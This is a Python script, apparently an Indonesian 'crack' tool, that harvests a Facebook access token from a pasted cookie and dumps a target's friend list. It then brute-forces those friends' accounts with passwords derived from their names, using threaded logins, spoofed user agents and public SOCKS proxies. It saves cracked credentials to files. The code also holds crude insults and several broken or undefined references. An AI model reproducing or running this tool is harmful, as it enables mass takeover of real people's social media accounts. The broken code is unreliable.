
try:
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import stdiomask
	import urllib.request
	import urllib.parse
	import calendar
	import base64,subprocess   
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re,binascii,base64,struct
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
from rich.progress import track
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.tree import Tree
from rich import print as prints
os.system("espeak -a 300 haloanjingkontolngentotngewewkwkwkpastiyatimpiatucandabang")
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
try:
	file_color = open("assets/theme_color","r").read()
	color_rich = file_color.split("|")[0]
	color_table = file_color.split("|")[1]
except:
	color_rich = "[#afafff]"
	color_table = "#FF0000"
sys.stdout.write('\x1b]2; RIZKI•XD\x07')
try:
	os.mkdir('result')
except:
	pass
try:os.mkdir("assets")
except:pass
SE = "[#9F9F9F]" # ABU
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
bc = '[bold cyan]'
acakrich=random.choice([H2,K2,B2,U2,N2,O2,J2,A2])
hapus  = '[/]'
zx=[]
try:
	link = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
	open('.prox.txt','w').write(link)
except:pass
try:
	from cleantext import clean
except:
	os.system("pip3 install clean-text")
	os.system("pip3 install Unidecode")
prox=open('.prox.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 269.0.0.18.75 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"
#ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],["sukses"]
HARIS={}
HARIS1={}
method=[]
ugen=[]
s=requests.Session()
zx=[]
baru=[]
ncek=[]
til = "Alex"
############UA#############
ugen5=[]
def uazku():
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; ru-ru; Redmi K20 Pro Premium Edition Build/QKQ1.{str(rr(111111,199999))}.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(71,99))}.0.{str(rr(3500,3900))}.{str(rr(140,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.5.2-go"
    uazku2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-G950W Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Flipboard/4.3.0/{str(rr(5300,5500))},4.3.0.{str(rr(5300,5500))}"
    uazku3 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36	Android"
    uazku4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; Infinix X683 Build/QP1A.{str(rr(111111,199999))}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5300,5900))}.{str(rr(75,150))} Mobile Safari/537.36 GoogleApp/13.47.8.26.arm64"
    uazku5 = f"Mozilla/5.0 (Linux; Android {str(rr(1,8))}.1.0; VSD243 Build/OPM8.{str(rr(111111,199999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(60,75))}.0.{str(rr(3100,3500))}.{str(rr(75,99))} Safari/537.36"
    uazku6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,7))}.{str(rr(1,5))}; EK-GC200 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,99))}.0.{str(rr(3400,3900))}.{str(rr(100,150))} Mobile Safari/537.36"
    uazku7 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5500,5900))}.{str(rr(120,150))} Mobile Safari/537.36"
    uazku8 = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5, uazku6, uazku7]))
    return uazku8ghhhj

for xc in range(1000):
    rr = random.randint
    rc = random.choice
    uaz1 = f"Instagram 218.0.0.19.108 Android (30/11; 320dpi; 720x1432; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; 345526700)"
    uaz2 = f"Mozilla/5.0 (Linux; Android 11; RMX3195 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} YaBrowser/22.1.0.{str(rr(190,199))} (lite) Mobile Safari/537.36"
    uaz3 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; OPPO; CPH2197; OP4F39L1; qcom; de_DE; {str(rr(422222222,499999999))})"
    uaz4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Infinix ; Infinix X682B; Infinix-X682B; mt6769; tr_TR; {str(rr(422222222,499999999))})"
    uaz5 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Vivo ; V2111; 2111; mt6765; ru_KZ; {str(rr(422222222,499999999))})"
    uaz6 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Samsung ; SM-G935T; hero2qltetmo; qcom; en_US; {str(rr(422222222,499999999))})"
    uaz7 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Xiomi ; Redmi K20; davinciin; qcom; de_DE; {str(rr(422222222,499999999))})"
    uaz8 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Iphone ; CPH2197; OP4F39L1; qcom; de_DE; {str(rr(422222222,499999999))})"
    uaz9 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; 5062 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Advan ; 5062; OP4F39L1; qcom; de_DE; {str(rr(422222222,499999999))})"
    uaz10 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Poco ; M2102J20SG; vayu; qcom; it_IT; {str(rr(422222222,499999999))})"
    uainsta = str(rc([uaz1, uaz2, uaz3,uaz4,uaz5, uaz6,uaz7, uaz8, uaz9, uaz10]))
    baru.append(uainsta)

for typo in range(10000):
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; Android 13; V2124 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]"
    uazku2 = f"Mozilla/5.0 (Linux; Android 10; vivo 2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36"
    uazku3 = f"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 1520) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537 UCBrowser/4.2.1.541 Mobile"
    uazku4 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15"
    uazku5 = f"Mozilla/5.0 (Linux; Android 13; RMX3636 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]"
    uazku6 = f"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN;PBAM00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 Quark/3.8.3.127 Mobile Safari/537.36"
    uazstart = str(rc([uazku1, uazku2, uazku3]))
    baru.append(uazstart)

for NazriXDGantengNgab in range(1000):
   android1 = rc(["3","4","5","6","7","8","9","10","11","12"])
   android2 = rc(["1.5","1.6","2.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.0","8.1.0","4.4.4","5.1","6.3"])
   adtyaxcc = rc(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
   aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
   chrome1 = rr(73,99)
   chrome2 = rr(4500,4900)
   chrome3 = rr(75,150)
   chrome4 = rr(111111,199999)
   buildhan = rc([
                  "MMB29P",
                  "MMB29K",
                  "LRX22G",
                  "LMY48B",
                  "JZO54K",
                  "KTU84P",
                  "KOT49H",
                  "JDQ39"])
   deviceku = rc([
                  "Lenovo TB-X104X",
                  "SM-G930VC",
                  "Nexus 6P",
                  "SAMSUNG SM-T550",
                  "HTC Legend 1.32.163.1",
                  "HTC_TATTOO_A3288",
                  "Nexus One",
                  "LG-L1100",
                  "SonyEricssonX10i",
                  "SM-A510F",
                  "SM-T560",
                  "B3-A20",
                  "XT720"])
   ugent1 = f"Mozilla/5.0 (Linux; Android {android1}; SM-R825F Build/QP1A.{chrome4}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36"
   ugent2 = f"Mozilla/5.0 (Linux; U; Android {android2}; {adtyaxcc}; {deviceku} Build/{buildhan}) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
   ugent3 = f"Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.{chrome4}.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36 OPR/48.2.{chrome2}.133{chrome3}"
   adtyaUAmain = rc([ugent1,ugent2,ugent3])
   ugen.append(adtyaUAmain)
hapus  = '[/]'
biru_m = '[bold cyan]'
# CLEAR
def clear():
	os.system('clear')
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Sore"
	else:timenow = "Selamat Malam"
	return timenow
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
def clear():
	os.system('clear')
def back():
	login()
###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	print(f'''
 {H}╭──╮ ZXMPL ╭─╮    {N}: Pake Seadanya
 {M}├──│╭┬╮╭──╮│││╭╮  {N}:
 {O}│──┤├│┤│││││╭╯│╰╮ {N}: {H}Jangan Di Prem,kan
 {K}╰──╯╰┴╯╰┴┴╯╰╯ ╰─╯ {N}: {P}Recode : Snifer\n {N}≠=====================================≠''')

###----------[ BAGIAN LOGIN COKIS ]----------###
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
ses = requests.Session()
def login_lagi334():
	os.system('clear')
	banner()
	print('')
	cok = input(f'{P}Masukkan cookie :{H} ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> {M}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);masuk();batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f'\n {P}Token : {H}{took}')
				exit()
	except Exception as e:
		print(e)
###----------[ BAGIAN MENU ]----------###
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(1)
		login_lagi334()
	os.system('clear')
	banner()
	print(f' {N}[{O}*{N}]{P} User Name : {K}{my_name}\n {N}[{O}*{N}]{P} Joined : {H}{tg}/{bl}/{th}')
	print(f' {N}≠=====================================≠')
	print(f' {N}[{B}1{N}]{P} Crack publik')
	print(f' {N}[{B}2{N}]{P} Result {H}ok{A}/{K}cp')
	print(f' {N}[{M}0{N}]{P} Logout {M}Cookie{N}')
	print(f' ≠=====================================≠')
	helpbas = input(f'{N} Pilih : ')
	print(f' ≠=====================================≠')
	if helpbas in ['1','01','001']:
		idt = input(f' {N}[{H}√{N}] {P}Masukan uid : {K}')
		dump(idt,"",{"cookie":cok},token)
		atur_dulu()
	elif helpbas in ['2','02','002']:
		result()
	elif helpbas in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'{N} Success logout')
		exit()
	else:
		exit()

###----------[ DUMP ID PUBLIK ]----------###
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r {N}[{H}√{N}] {P}Sedang dump uid : {H}{len(id)}{N} "),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

###---------- [ RESULT AKUN ] -----------###
def result():
	print(f'[!] 1. Hasil {H}OK{N} Anda ')
	print(f'[!] 2. Hasil {K}CP{N} Anda ')
	print('[!] 3. Kembali	')
	rohman_ganteng = input(f'\n[?] Pilih : ')
	if rohman_ganteng in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('[!] Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f' %s. %s ({K} %s {N}Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n[?] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('[!] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{N}{K}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{N}[{M} Klik Enter{N} ]')
			back()
	elif rohman_ganteng in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('[!] Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f' %s. %s ( {H}%s{N} Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f' %s. %s ({H} %s {N}Id )'%(cih,isi,(len(hem))))
			geeh = input(f'\n[?] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('[•] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{N}{H}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{N}[{M} Klik Enter{N} ]')
			back()
	elif rohman_ganteng in ['3']:
		back()
	else:
		print('[!] Pilih Yang Bener  ')
		back()
###----------[ ATUR SBLUM KREK ]----------###
def atur_dulu():
	print(f'\n ≠=====================================≠')
	print(f' {N}[{P}1{N}] {M}Old    {N}[{P}2{N}] {K}New    {N}[{P}3{N}] {H}Random{N}')
	print(f' ≠=====================================≠')
	aturid = input(f'{N} Choose : ')
	print(f' ≠=====================================≠')
	if aturid in ['1','01']:
		for akunlama in sorted(id):
			id2.append(akunlama)
	elif aturid in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		waktu(1)
		atur_dulu()
		exit()
		

	print(f' {N}[{O}1{N}]{H} mobile     {N}[{O}2{N}]{H} validate{N}')
	print(f' ≠=====================================≠')
	metod = input(f'{N} Choose : ')
	print(f' ≠=====================================≠')
	if metod in ['1','01']:
		baz.append('metod1')
	elif metod in ['2','02']:
		baz.append('validate')
	else:
		baz.append('metod1')
		
	pwplus=input(f' {N}[{M}*{N}]{P} Mau Nambah PW Manual ? y/t : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'{P} PW Manual Menimal 6 Hurup\n Contoh : {M}kuntul,panjang')
		pwku=input(f'{O} Masukan PW : {H}')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
		
	print(f' {N}≠=====================================≠')
	uatambah= input(f' {N}[{M}*{N}]{P} Tambah UA Manual ? y/t : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		anjai = input(f'{P} Masukan UA : {U}')
		ualu.append(anjai)
	else:
		ualuh.append('tidak')
	passwrd()

###----------[ BAGIAN PASSWORD ]----------###
def passwrd():
	global prog,des
	print(f' {N}≠=====================================≠')
	print(f' {P}acun {H}ok {P}save di : {H}{okh}\n {P}acun {K}cp {P}save di : {K}{cph}{N}')
	print(f' ≠=====================================≠')
	print(f'{N}')
	awal = datetime.datetime.now()
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for aldous in id2:
				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = ['bagong','sayang','jancok']
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'12')
						pwv.append(frs+'21')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'07')
				if '><v><' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'metod1' in baz:
					gas_krek.submit(metod1,idf,pwv,awal)
				elif 'validate' in baz:
					gas_krek.submit(crackvalidate,idf,pwv,awal)
				else:
					gas_krek.submit(metod1,idf,pwv)
		print(f'{N}')
		print(f'{H}+ {P}Akun OK  : {H}%s{N} '%(ok))
		print(f'{K}+ {P}Akun CP  : {K}%s{N} '%(cp))
		print(f'{N}')
		
###--------- [ METHODE ] ----------###
def crackvalidate(idf,pwv,awal):
	global loop,ok,cp
	ahir = str(datetime.datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"\r[bold cyan]{ahir} [bold purple][[bold green]OK[bold white]:[bold green]{ok}{M}/[bold yellow]CP[bold white]:[bold yellow]{cp}[purple]] [bold white]{loop}[bold red]/[bold white]{len(id)} ")
	prog.advance(des)
	ua = random.choice(ugen1)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://iphone.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'iphone.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'yW2guQRJM3jnGatG5yBvokfcLBkNHf9n2TcoDukeOmMfVSQ2JjqH9nh8kfJmiz+n3M1iN4Le5FFdFEGSAsdQpA==','content-length': '166','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://iphone.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://iphone.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"\r{A}[{K}CP{A}] {K}{idf} | {pw} {M}~ {B}{tahun(idf)}{N}")
				open('CP/'+cph,'a').write(f'{idf}|{pw}\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
